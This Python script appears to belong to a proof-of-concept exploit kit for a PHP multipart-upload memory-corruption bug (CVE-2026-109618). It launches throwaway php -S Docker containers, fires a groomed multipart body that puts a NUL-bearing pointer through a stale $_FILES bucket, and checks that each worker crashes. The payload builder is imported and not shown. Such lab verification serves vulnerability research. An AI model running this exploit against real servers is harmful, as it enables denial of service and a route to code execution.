#!/usr/bin/env python3
# INDEX: black-box reliability check for the binary-safe value-channel seat | cli | self-managed disposable php -S
"""verify_stale_bucket_value_seat.py - black-box check for the CVE-2026-109618
binary-safe value channel (primitives/groom/stale_bucket_value_seat.seat_body).

Fires the value-channel seat with a NUL-BEARING S (0x00007f4142434400) at
disposable stock `php -S` containers and asserts each worker dies: the stale
$_FILES bucket's val.value is carved from the field-value fill and dispatched
at shutdown, so a value the NUL-truncating name channel could never carry
(every real heap address has NUL bytes) still reaches the deref. Manages one
container per trial (`docker run --rm`, stock php:<image>-cli, docroot
lab/app/); HTTP-reachable before the POST, unreachable after.

Black-box asserts the crash; the gdb-seated check that the fault rdi == S
(ASLR off) is in the primitive's docstring. SKIPs cleanly without docker.

Usage:
    python3 -I poc/primitives/groom/verify_stale_bucket_value_seat.py [--trials 3]
        [--pads 320,340,350] [--image php:8.4.26-cli] [--port-base 18990]
    # or against a target you restart by hand:
    python3 -I .../verify_stale_bucket_value_seat.py --url http://127.0.0.1:18980
"""
from __future__ import annotations

import argparse
import os
import subprocess
import sys
import time

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_urllib import http  # noqa: E402
from common.multipart import PHP2SHELL_BOUNDARY_B as BND  # noqa: E402
from primitives.groom.stale_bucket_value_seat import seat_body  # noqa: E402

LAB_APP = os.path.join(_POC_ROOT, "..", "lab", "app")
NUL_S = 0x00007f4142434400   # NUL bytes at offsets 0, 6, 7 -- unreachable via the name channel
PHP_INI = ["-d", "memory_limit=16M", "-d", "post_max_size=160M",
           "-d", "max_input_vars=1000000", "-d", "max_file_uploads=1000000",
           "-d", "max_multipart_body_parts=1000000",
           "-d", "display_errors=0", "-d", "log_errors=1"]


def docker_ok():
    try:
        return subprocess.run(["docker", "info"], capture_output=True, timeout=10).returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def spawn(name, port, image):
    cmd = ["docker", "run", "-d", "--rm", "--name", name, "-p", f"{port}:80",
           "-v", f"{LAB_APP}:/var/www/html:ro", image, "php", *PHP_INI,
           "-S", "0.0.0.0:80", "-t", "/var/www/html"]
    return subprocess.run(cmd, capture_output=True, timeout=60).returncode == 0


def alive(base, path="/index.php", timeout=3):
    s, _ = http(base + path, timeout=timeout)
    return s == 200


def wait_alive(base, timeout=10.0):
    t0 = time.time()
    while time.time() - t0 < timeout:
        if alive(base):
            return True
        time.sleep(0.3)
    return False


def fire(base, pad):
    ct = "multipart/form-data; boundary=" + BND.decode()
    body = seat_body(NUL_S, pad, padsz=16384, nflood=50, floodsz=288)
    return http(base + "/poc.php", data=body,
                headers={"Content-Type": ct, "Content-Length": str(len(body))}, timeout=120)


def run_trial(i, base, pad):
    s, _ = fire(base, pad)
    died = not alive(base, timeout=5)
    print(f"[trial {i}] pad={pad}  HTTP={s}  worker {'DEAD' if died else 'alive'}")
    return died


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--url", default=None)
    ap.add_argument("--trials", type=int, default=3)
    ap.add_argument("--pads", default="320,340,350")
    ap.add_argument("--image", default="php:8.4.26-cli")
    ap.add_argument("--port-base", type=int, default=18990)
    a = ap.parse_args()
    pads = [int(x) for x in a.pads.split(",")]

    results = []
    if a.url:
        base = a.url.rstrip("/")
        if not wait_alive(base, 5):
            print(f"[SKIP] {base} not reachable")
            return 2
        results.append(run_trial(0, base, pads[0]))
    else:
        if not docker_ok():
            print("[SKIP] docker unavailable; bring a target up and rerun with --url")
            return 2
        for i in range(a.trials):
            name = f"p2s-sbvs-{os.getpid()}-{i}"
            port = a.port_base + i
            if not spawn(name, port, a.image):
                print(f"[trial {i}] docker run failed")
                return 2
            try:
                base = f"http://127.0.0.1:{port}"
                if not wait_alive(base, 10):
                    print(f"[trial {i}] target never came up")
                    return 2
                results.append(run_trial(i, base, pads[i % len(pads)]))
            finally:
                subprocess.run(["docker", "stop", "-t", "2", name], capture_output=True, timeout=15)

    ok = bool(results) and all(results)
    print(f"\n== VERDICT: {'PASS' if ok else 'FAIL'} "
          f"({sum(1 for r in results if r)}/{len(results)} workers killed at NUL-bearing S) ==")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
